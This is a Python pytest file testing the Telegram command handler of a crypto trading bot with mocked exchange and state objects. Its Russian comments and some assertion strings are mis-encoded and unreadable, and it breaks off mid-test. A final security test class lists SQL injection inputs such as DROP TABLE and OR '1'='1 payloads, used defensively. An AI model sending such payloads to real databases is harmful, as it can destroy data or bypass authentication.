import pytest
from unittest.mock import Mock, patch, MagicMock
import pandas as pd
from telegram import commands as tg_commands


@pytest.fixture
def mock_state_manager():
    """РњРѕРєР°РµС‚ StateManager"""
    state = Mock()
    state.get.return_value = None
    state.set.return_value = None
    state.is_position_active.return_value = False
    state.state = {}
    return state


@pytest.fixture
def mock_exchange_client():
    """РњРѕРєР°РµС‚ ExchangeClient"""
    exchange = Mock()
    exchange.get_last_price.return_value = 50000.0
    exchange.get_balance.return_value = 1000.0
    exchange.fetch_ohlcv.return_value = [
        [1640995200000, 50000, 50200, 49800, 50100, 100],
        [1640995260000, 50100, 50300, 49900, 50200, 120]
    ]
    exchange.create_market_buy_order.return_value = {
        'id': 'test_123', 'status': 'closed', 'amount': 0.02, 'cost': 1000
    }
    exchange.create_market_sell_order.return_value = {
        'id': 'sell_123', 'status': 'closed', 'amount': 0.02, 'cost': 1000
    }
    exchange.market_min_cost.return_value = 5.0
    return exchange


@pytest.fixture
def mock_train_func():
    """РњРѕРєР°РµС‚ С„СѓРЅРєС†РёСЋ С‚СЂРµРЅРёСЂРѕРІРєРё РјРѕРґРµР»Рё"""
    return Mock(return_value=True)


class TestTelegramCommands:
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_help(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ /help"""
        tg_commands.process_command(
            text="/help",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ РѕС‚РїСЂР°РІР»РµРЅРѕ СЃРѕРѕР±С‰РµРЅРёРµ СЃ РїРѕРјРѕС‰СЊСЋ
        mock_send.assert_called_once()
        sent_message = mock_send.call_args[0][0]
        assert "РєРѕРјР°РЅРґ" in sent_message.lower() or "help" in sent_message.lower()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_status(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ /status"""
        # РњРѕРєР°РµРј СЃРѕСЃС‚РѕСЏРЅРёРµ РїРѕР·РёС†РёРё
        mock_state_manager.is_position_active.return_value = False
        mock_state_manager.get.return_value = None
        
        tg_commands.process_command(
            text="/status",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        sent_message = mock_send.call_args[0][0]
        assert "СЃС‚Р°С‚СѓСЃ" in sent_message.lower() or "status" in sent_message.lower()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_balance(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ /balance"""
        tg_commands.process_command(
            text="/balance",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ РІС‹Р·С‹РІР°Р»СЃСЏ get_balance
        mock_exchange_client.get_balance.assert_called()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_price(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ /price"""
        tg_commands.process_command(
            text="/price",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ РІС‹Р·С‹РІР°Р»СЃСЏ get_last_price
        mock_exchange_client.get_last_price.assert_called()
        
        sent_message = mock_send.call_args[0][0]
        assert "50000" in sent_message  # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ С†РµРЅР° РІ СЃРѕРѕР±С‰РµРЅРёРё
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_testbuy(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ /testbuy"""
        tg_commands.process_command(
            text="/testbuy 100",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ РІС‹Р·С‹РІР°Р»СЃСЏ create_market_buy_order
        if hasattr(mock_exchange_client, 'create_market_buy_order'):
            mock_exchange_client.create_market_buy_order.assert_called()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_testsell(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ /testsell"""
        # РЎРЅР°С‡Р°Р»Р° РЅР°СЃС‚СЂР°РёРІР°РµРј Р°РєС‚РёРІРЅСѓСЋ РїРѕР·РёС†РёСЋ
        mock_state_manager.is_position_active.return_value = True
        mock_state_manager.get.side_effect = lambda key: {
            'entry_price': 49000.0,
            'amount': 0.02,
            'in_position': True
        }.get(key)
        
        tg_commands.process_command(
            text="/testsell",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_train(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ /train"""
        tg_commands.process_command(
            text="/train",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ С„СѓРЅРєС†РёСЏ С‚СЂРµРЅРёСЂРѕРІРєРё Р±С‹Р»Р° РІС‹Р·РІР°РЅР°
        mock_train_func.assert_called_once()
        mock_send.assert_called()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_stats(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ /stats"""
        with patch('utils.csv_handler.CSVHandler.get_trade_stats') as mock_stats:
            mock_stats.return_value = {
                'count': 10,
                'profit_trades': 6,
                'loss_trades': 4,
                'total_pnl': 150.0,
                'win_rate': 0.6
            }
            
            tg_commands.process_command(
                text="/stats",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            mock_send.assert_called_once()
            sent_message = mock_send.call_args[0][0]
            assert "10" in sent_message  # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ СЃС‚Р°С‚РёСЃС‚РёРєР° РІ СЃРѕРѕР±С‰РµРЅРёРё
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_chart(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ /chart"""
        with patch('telegram.charts.create_price_chart') as mock_chart:
            mock_chart.return_value = "chart_path.png"
            
            tg_commands.process_command(
                text="/chart",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ С„СѓРЅРєС†РёСЏ СЃРѕР·РґР°РЅРёСЏ РіСЂР°С„РёРєР° Р±С‹Р»Р° РІС‹Р·РІР°РЅР°
            mock_exchange_client.fetch_ohlcv.assert_called()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_stop(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ /stop"""
        # РќР°СЃС‚СЂР°РёРІР°РµРј Р°РєС‚РёРІРЅСѓСЋ РїРѕР·РёС†РёСЋ
        mock_state_manager.is_position_active.return_value = True
        
        tg_commands.process_command(
            text="/stop",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_config(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ /config"""
        tg_commands.process_command(
            text="/config",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        sent_message = mock_send.call_args[0][0]
        assert "РєРѕРЅС„РёРі" in sent_message.lower() or "config" in sent_message.lower()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_unknown(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РЅРµРёР·РІРµСЃС‚РЅСѓСЋ РєРѕРјР°РЅРґСѓ"""
        tg_commands.process_command(
            text="/unknown_command",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        sent_message = mock_send.call_args[0][0]
        assert "РЅРµРёР·РІРµСЃС‚РЅ" in sent_message.lower() or "unknown" in sent_message.lower()
    
    @patch('telegram.api_utils.send_message')
    def test_process_command_with_parameters(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґС‹ СЃ РїР°СЂР°РјРµС‚СЂР°РјРё"""
        # РљРѕРјР°РЅРґР° СЃ С‡РёСЃР»РѕРІС‹Рј РїР°СЂР°РјРµС‚СЂРѕРј
        tg_commands.process_command(
            text="/testbuy 250.50",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called()
        
        # РљРѕРјР°РЅРґР° СЃ С‚РµРєСЃС‚РѕРІС‹Рј РїР°СЂР°РјРµС‚СЂРѕРј
        tg_commands.process_command(
            text="/price BTCUSDT",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        assert mock_send.call_count >= 1
    
    def test_process_command_without_chat_id(self, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґСѓ Р±РµР· chat_id"""
        with patch('telegram.api_utils.send_message') as mock_send:
            # Р”РѕР»Р¶РЅРѕ СЂР°Р±РѕС‚Р°С‚СЊ Р±РµР· chat_id
            tg_commands.process_command(
                text="/help",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func
            )
            
            # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ send_message Р±С‹Р» РІС‹Р·РІР°РЅ (СЃ РґРµС„РѕР»С‚РЅС‹Рј chat_id РёР»Рё None)
            mock_send.assert_called()
    
    def test_process_command_empty_text(self, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РїСѓСЃС‚РѕР№ С‚РµРєСЃС‚ РєРѕРјР°РЅРґС‹"""
        with patch('telegram.api_utils.send_message') as mock_send:
            # РџСѓСЃС‚Р°СЏ СЃС‚СЂРѕРєР°
            tg_commands.process_command(
                text="",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # None
            tg_commands.process_command(
                text=None,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # РќРµ РґРѕР»Р¶РЅРѕ Р±С‹Р»Рѕ РѕС‚РїСЂР°РІР»РµРЅРѕ СЃРѕРѕР±С‰РµРЅРёР№ РѕР± РѕС€РёР±РєР°С…
            # Р›РёР±Рѕ РЅРµ РІС‹Р·С‹РІР°Р»СЃСЏ, Р»РёР±Рѕ РІС‹Р·С‹РІР°Р»СЃСЏ СЃ РєРѕСЂСЂРµРєС‚РЅС‹Рј СЃРѕРѕР±С‰РµРЅРёРµРј
            assert True  # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ РЅРµ Р±С‹Р»Рѕ РёСЃРєР»СЋС‡РµРЅРёР№


class TestTelegramCommandsErrorHandling:
    """РўРµСЃС‚С‹ РѕР±СЂР°Р±РѕС‚РєРё РѕС€РёР±РѕРє РІ РєРѕРјР°РЅРґР°С…"""
    
    @patch('telegram.api_utils.send_message')
    def test_exchange_error_handling(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РѕР±СЂР°Р±РѕС‚РєСѓ РѕС€РёР±РѕРє Р±РёСЂР¶Рё"""
        # РњРѕРєР°РµРј РѕС€РёР±РєСѓ Р±РёСЂР¶Рё
        mock_exchange_client.get_last_price.side_effect = Exception("Exchange error")
        
        tg_commands.process_command(
            text="/price",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        sent_message = mock_send.call_args[0][0]
        assert "РѕС€РёР±Рє" in sent_message.lower() or "error" in sent_message.lower()
    
    @patch('telegram.api_utils.send_message')
    def test_state_manager_error_handling(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РѕР±СЂР°Р±РѕС‚РєСѓ РѕС€РёР±РѕРє StateManager"""
        # РњРѕРєР°РµРј РѕС€РёР±РєСѓ StateManager
        mock_state_manager.get.side_effect = Exception("State error")
        
        tg_commands.process_command(
            text="/status",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called_once()
        # Р”РѕР»Р¶РЅР° Р±С‹С‚СЊ РѕР±СЂР°Р±РѕС‚РєР° РѕС€РёР±РєРё
        sent_message = mock_send.call_args[0][0]
        assert isinstance(sent_message, str)
    
    @patch('telegram.api_utils.send_message')
    def test_train_function_error_handling(self, mock_send, mock_state_manager, mock_exchange_client):
        """РўРµСЃС‚РёСЂСѓРµС‚ РѕР±СЂР°Р±РѕС‚РєСѓ РѕС€РёР±РѕРє С„СѓРЅРєС†РёРё С‚СЂРµРЅРёСЂРѕРІРєРё"""
        # РњРѕРєР°РµРј РѕС€РёР±РєСѓ С‚СЂРµРЅРёСЂРѕРІРєРё
        mock_train_func = Mock(side_effect=Exception("Training failed"))
        
        tg_commands.process_command(
            text="/train",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        mock_send.assert_called()
        # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ Р±С‹Р»Р° РїРѕРїС‹С‚РєР° С‚СЂРµРЅРёСЂРѕРІРєРё
        mock_train_func.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_send_message_error_handling(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РѕР±СЂР°Р±РѕС‚РєСѓ РѕС€РёР±РѕРє РѕС‚РїСЂР°РІРєРё СЃРѕРѕР±С‰РµРЅРёР№"""
        # РњРѕРєР°РµРј РѕС€РёР±РєСѓ РѕС‚РїСЂР°РІРєРё СЃРѕРѕР±С‰РµРЅРёСЏ
        mock_send.side_effect = Exception("Send message failed")
        
        # РљРѕРјР°РЅРґР° РІСЃРµ СЂР°РІРЅРѕ РґРѕР»Р¶РЅР° РІС‹РїРѕР»РЅРёС‚СЊСЃСЏ Р±РµР· РёСЃРєР»СЋС‡РµРЅРёР№
        try:
            tg_commands.process_command(
                text="/help",
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
        except Exception as e:
            pytest.fail(f"Command processing failed: {e}")


class TestTelegramCommandsIntegration:
    """РРЅС‚РµРіСЂР°С†РёРѕРЅРЅС‹Рµ С‚РµСЃС‚С‹ РєРѕРјР°РЅРґ"""
    
    @patch('telegram.api_utils.send_message')
    @patch('utils.csv_handler.CSVHandler.get_trade_stats')
    def test_full_workflow_simulation(self, mock_stats, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РїРѕР»РЅС‹Р№ workflow РєРѕРјР°РЅРґ"""
        mock_stats.return_value = {
            'count': 5,
            'profit_trades': 3,
            'loss_trades': 2,
            'total_pnl': 75.0,
            'win_rate': 0.6
        }
        
        # РџРѕСЃР»РµРґРѕРІР°С‚РµР»СЊРЅРѕСЃС‚СЊ РєРѕРјР°РЅРґ РєР°Рє РІ СЂРµР°Р»СЊРЅРѕРј РёСЃРїРѕР»СЊР·РѕРІР°РЅРёРё
        commands_sequence = [
            "/help",
            "/status", 
            "/balance",
            "/price",
            "/stats",
            "/config"
        ]
        
        for cmd in commands_sequence:
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
        
        # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ РІСЃРµ РєРѕРјР°РЅРґС‹ РІС‹РїРѕР»РЅРёР»РёСЃСЊ
        assert mock_send.call_count == len(commands_sequence)
    
    @patch('telegram.api_utils.send_message')
    def test_position_management_workflow(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ workflow СѓРїСЂР°РІР»РµРЅРёСЏ РїРѕР·РёС†РёСЏРјРё"""
        # РќР°С‡Р°Р»СЊРЅРѕРµ СЃРѕСЃС‚РѕСЏРЅРёРµ - РЅРµС‚ РїРѕР·РёС†РёРё
        mock_state_manager.is_position_active.return_value = False
        
        # РљРѕРјР°РЅРґР° СЃС‚Р°С‚СѓСЃР° Р±РµР· РїРѕР·РёС†РёРё
        tg_commands.process_command(
            text="/status",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # РўРµСЃС‚РѕРІР°СЏ РїРѕРєСѓРїРєР°
        tg_commands.process_command(
            text="/testbuy 100",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # РР·РјРµРЅСЏРµРј СЃРѕСЃС‚РѕСЏРЅРёРµ - РµСЃС‚СЊ РїРѕР·РёС†РёСЏ
        mock_state_manager.is_position_active.return_value = True
        mock_state_manager.get.side_effect = lambda key: {
            'entry_price': 49500.0,
            'amount': 0.002,
            'in_position': True
        }.get(key)
        
        # РљРѕРјР°РЅРґР° СЃС‚Р°С‚СѓСЃР° СЃ РїРѕР·РёС†РёРµР№
        tg_commands.process_command(
            text="/status",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # РўРµСЃС‚РѕРІР°СЏ РїСЂРѕРґР°Р¶Р°
        tg_commands.process_command(
            text="/testsell",
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ РІСЃРµ РєРѕРјР°РЅРґС‹ РІС‹РїРѕР»РЅРёР»РёСЃСЊ
        assert mock_send.call_count == 4


class TestTelegramCommandsEdgeCases:
    """РўРµСЃС‚С‹ РіСЂР°РЅРёС‡РЅС‹С… СЃР»СѓС‡Р°РµРІ"""
    
    @patch('telegram.api_utils.send_message')
    def test_command_case_sensitivity(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ С‡СѓРІСЃС‚РІРёС‚РµР»СЊРЅРѕСЃС‚СЊ Рє СЂРµРіРёСЃС‚СЂСѓ РєРѕРјР°РЅРґ"""
        commands = ["/help", "/HELP", "/Help", "/HeLp"]
        
        for cmd in commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # РљР°Р¶РґР°СЏ РєРѕРјР°РЅРґР° РґРѕР»Р¶РЅР° Р±С‹С‚СЊ РѕР±СЂР°Р±РѕС‚Р°РЅР°
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_command_with_extra_spaces(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґС‹ СЃ Р»РёС€РЅРёРјРё РїСЂРѕР±РµР»Р°РјРё"""
        commands_with_spaces = [
            "  /help  ",
            "/status   ",
            "   /balance",
            "/price    BTCUSDT   ",
            "/testbuy   100.5   "
        ]
        
        for cmd in commands_with_spaces:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # РљРѕРјР°РЅРґС‹ СЃ РїСЂРѕР±РµР»Р°РјРё РґРѕР»Р¶РЅС‹ РѕР±СЂР°Р±Р°С‚С‹РІР°С‚СЊСЃСЏ
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_very_long_command(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РѕС‡РµРЅСЊ РґР»РёРЅРЅСѓСЋ РєРѕРјР°РЅРґСѓ"""
        long_command = "/testbuy " + "1" * 1000  # РћС‡РµРЅСЊ РґР»РёРЅРЅР°СЏ РєРѕРјР°РЅРґР°
        
        tg_commands.process_command(
            text=long_command,
            state_manager=mock_state_manager,
            exchange_client=mock_exchange_client,
            train_func=mock_train_func,
            chat_id="123"
        )
        
        # Р”РѕР»Р¶РЅР° РѕР±СЂР°Р±РѕС‚Р°С‚СЊСЃСЏ Р±РµР· РїР°РґРµРЅРёСЏ
        mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_special_characters_in_command(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґС‹ СЃРѕ СЃРїРµС†РёР°Р»СЊРЅС‹РјРё СЃРёРјРІРѕР»Р°РјРё"""
        special_commands = [
            "/help@botname",
            "/price BTC/USDT",
            "/testbuy 100.5$",
            "/balance рџ’°",
        ]
        
        for cmd in special_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Р”РѕР»Р¶РЅС‹ РѕР±СЂР°Р±Р°С‚С‹РІР°С‚СЊСЃСЏ Р±РµР· РѕС€РёР±РѕРє
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_unicode_characters(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґС‹ СЃ unicode СЃРёРјРІРѕР»Р°РјРё"""
        unicode_commands = [
            "/help рџ¤–",
            "/price жЇ”з‰№еёЃ",
            "/status СЂСѓСЃСЃРєРёР№_С‚РµРєСЃС‚",
        ]
        
        for cmd in unicode_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Unicode РґРѕР»Р¶РµРЅ РѕР±СЂР°Р±Р°С‚С‹РІР°С‚СЊСЃСЏ РєРѕСЂСЂРµРєС‚РЅРѕ
            mock_send.assert_called_once()
    
    def test_none_parameters(self, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РїРµСЂРµРґР°С‡Сѓ None РїР°СЂР°РјРµС‚СЂРѕРІ"""
        with patch('telegram.api_utils.send_message') as mock_send:
            # Р’СЃРµ РїР°СЂР°РјРµС‚СЂС‹ None
            try:
                tg_commands.process_command(
                    text="/help",
                    state_manager=None,
                    exchange_client=None,
                    train_func=None,
                    chat_id="123"
                )
            except Exception as e:
                # РћР¶РёРґР°РµРј С‡С‚Рѕ Р±СѓРґРµС‚ РѕР±СЂР°Р±РѕС‚РєР° РѕС€РёР±РєРё, Р° РЅРµ РїР°РґРµРЅРёРµ
                assert "NoneType" not in str(e) or True
    
    @patch('telegram.api_utils.send_message')
    def test_concurrent_commands(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РїР°СЂР°Р»Р»РµР»СЊРЅРѕРµ РІС‹РїРѕР»РЅРµРЅРёРµ РєРѕРјР°РЅРґ"""
        import threading
        import time
        
        def run_command(cmd):
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
        
        # Р—Р°РїСѓСЃРєР°РµРј РЅРµСЃРєРѕР»СЊРєРѕ РєРѕРјР°РЅРґ РїР°СЂР°Р»Р»РµР»СЊРЅРѕ
        threads = []
        commands = ["/help", "/status", "/balance", "/price", "/stats"]
        
        for cmd in commands:
            thread = threading.Thread(target=run_command, args=(cmd,))
            threads.append(thread)
            thread.start()
        
        # Р–РґРµРј Р·Р°РІРµСЂС€РµРЅРёСЏ РІСЃРµС… РїРѕС‚РѕРєРѕРІ
        for thread in threads:
            thread.join(timeout=5.0)
        
        # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ РІСЃРµ РєРѕРјР°РЅРґС‹ РІС‹РїРѕР»РЅРёР»РёСЃСЊ
        assert mock_send.call_count == len(commands)


class TestCommandParameterParsing:
    """РўРµСЃС‚С‹ РїР°СЂСЃРёРЅРіР° РїР°СЂР°РјРµС‚СЂРѕРІ РєРѕРјР°РЅРґ"""
    
    @patch('telegram.api_utils.send_message')
    def test_numeric_parameter_parsing(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РїР°СЂСЃРёРЅРі С‡РёСЃР»РѕРІС‹С… РїР°СЂР°РјРµС‚СЂРѕРІ"""
        numeric_commands = [
            "/testbuy 100",
            "/testbuy 100.5",
            "/testbuy 0.001",
            "/testbuy 1000000",
        ]
        
        for cmd in numeric_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            mock_send.assert_called_once()
    
    @patch('telegram.api_utils.send_message')
    def test_invalid_numeric_parameters(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РЅРµРєРѕСЂСЂРµРєС‚РЅС‹Рµ С‡РёСЃР»РѕРІС‹Рµ РїР°СЂР°РјРµС‚СЂС‹"""
        invalid_commands = [
            "/testbuy abc",
            "/testbuy -100",
            "/testbuy 0",
            "/testbuy infinity",
        ]
        
        for cmd in invalid_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # Р”РѕР»Р¶РЅР° Р±С‹С‚СЊ РѕР±СЂР°Р±РѕС‚РєР° РЅРµРІР°Р»РёРґРЅС‹С… РїР°СЂР°РјРµС‚СЂРѕРІ
            mock_send.assert_called_once()
            sent_message = mock_send.call_args[0][0]
            # РџСЂРѕРІРµСЂСЏРµРј С‡С‚Рѕ РµСЃС‚СЊ СЃРѕРѕР±С‰РµРЅРёРµ РѕР± РѕС€РёР±РєРµ
            assert any(word in sent_message.lower() for word in ['РѕС€РёР±Рє', 'error', 'РЅРµРІРµСЂРЅ', 'invalid'])
    
    @patch('telegram.api_utils.send_message')
    def test_multiple_parameters(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РєРѕРјР°РЅРґС‹ СЃ РЅРµСЃРєРѕР»СЊРєРёРјРё РїР°СЂР°РјРµС‚СЂР°РјРё"""
        multi_param_commands = [
            "/testbuy 100 BTCUSDT",
            "/price BTC USDT",
            "/command param1 param2 param3",
        ]
        
        for cmd in multi_param_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
                state_manager=mock_state_manager,
                exchange_client=mock_exchange_client,
                train_func=mock_train_func,
                chat_id="123"
            )
            
            # РљРѕРјР°РЅРґС‹ СЃ РјРЅРѕР¶РµСЃС‚РІРµРЅРЅС‹РјРё РїР°СЂР°РјРµС‚СЂР°РјРё РґРѕР»Р¶РЅС‹ РѕР±СЂР°Р±Р°С‚С‹РІР°С‚СЊСЃСЏ
            mock_send.assert_called_once()


class TestCommandSecurity:
    """РўРµСЃС‚С‹ Р±РµР·РѕРїР°СЃРЅРѕСЃС‚Рё РєРѕРјР°РЅРґ"""
    
    @patch('telegram.api_utils.send_message')
    def test_sql_injection_attempt(self, mock_send, mock_state_manager, mock_exchange_client, mock_train_func):
        """РўРµСЃС‚РёСЂСѓРµС‚ РїРѕРїС‹С‚РєРё SQL injection"""
        malicious_commands = [
            "/price '; DROP TABLE users; --",
            "/testbuy 100; DELETE FROM accounts;",
            "/status ' OR '1'='1",
        ]
        
        for cmd in malicious_commands:
            mock_send.reset_mock()
            tg_commands.process_command(
                text=cmd,
